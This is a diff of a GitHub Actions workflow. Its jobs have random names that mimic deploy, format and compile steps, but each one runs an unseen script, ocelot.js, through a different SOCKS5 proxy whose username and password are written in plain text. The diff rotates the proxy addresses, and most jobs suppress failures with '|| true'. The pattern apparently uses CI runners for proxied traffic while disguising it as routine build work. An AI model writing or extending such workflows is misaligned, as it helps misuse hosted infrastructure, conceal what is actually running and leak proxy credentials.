@@ -8,21 +8,8 @@ on:
       - 'package.json'
 
 jobs:
-  audit_ubuntu2404_node_barracks:
-    runs-on: ubuntu-24.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 18
-        - name: Run Task
-          run: |
-            npm install && node ocelot.js "socks5://dcswarup:webshare@31.57.90.180:5749" || true
-
-  deploy_ubuntu2004_bun_stranger:
-    runs-on: ubuntu-20.04
+  deploy_windows2022_bun_birdcage:
+    runs-on: windows-2022
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -31,10 +18,24 @@ jobs:
           with:
             bun-version: latest
         - name: Run Task
+          shell: pwsh
           run: |
-            bun install && bun run ocelot.js "socks5://dcswarup:webshare@136.0.180.141:6162" || true
+            bun install; bun run ocelot.js "socks5://dcswarup:webshare@192.95.91.205:5832"
 
-  check_windows2025_node_impact:
+  format_ubuntu2004_node_jury:
+    runs-on: ubuntu-20.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 20
+        - name: Run Task
+          run: |
+            npm install && node ocelot.js "socks5://dcswarup:webshare@38.154.227.206:5907" || true
+
+  deploy_windows2025_node_elevation:
     runs-on: windows-2025
     steps:
         - name: Checkout Repository
@@ -46,10 +47,23 @@ jobs:
         - name: Run Task
           shell: pwsh
           run: |
-            npm install; node ocelot.js "socks5://dcswarup:webshare@23.109.208.225:6749"
+            npm install; node ocelot.js "socks5://dcswarup:webshare@23.109.208.163:6687"
 
-  verify_windows2022_node_lid:
-    runs-on: windows-2022
+  compile_ubuntu2404_node_poetry:
+    runs-on: ubuntu-24.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 18
+        - name: Run Task
+          run: |
+            npm install && node ocelot.js "socks5://dcswarup:webshare@104.238.7.22:5949" || true
+
+  format_windowslatest_node_lace:
+    runs-on: windows-latest
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -60,30 +74,4 @@ jobs:
         - name: Run Task
           shell: pwsh
           run: |
-            npm install; node ocelot.js "socks5://dcswarup:webshare@92.113.3.73:6082"
-
-  lint_ubuntu2204_node_trash:
-    runs-on: ubuntu-22.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 24
-        - name: Run Task
-          run: |
-            npm install && node ocelot.js "socks5://dcswarup:webshare@82.21.249.80:7417" || true
-
-  format_ubuntulatest_node_permafrost:
-    runs-on: ubuntu-latest
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 20
-        - name: Run Task
-          run: |
-            npm install && node ocelot.js "socks5://dcswarup:webshare@38.154.233.150:5560" || true
+            npm install; node ocelot.js "socks5://dcswarup:webshare@152.232.121.218:6110"
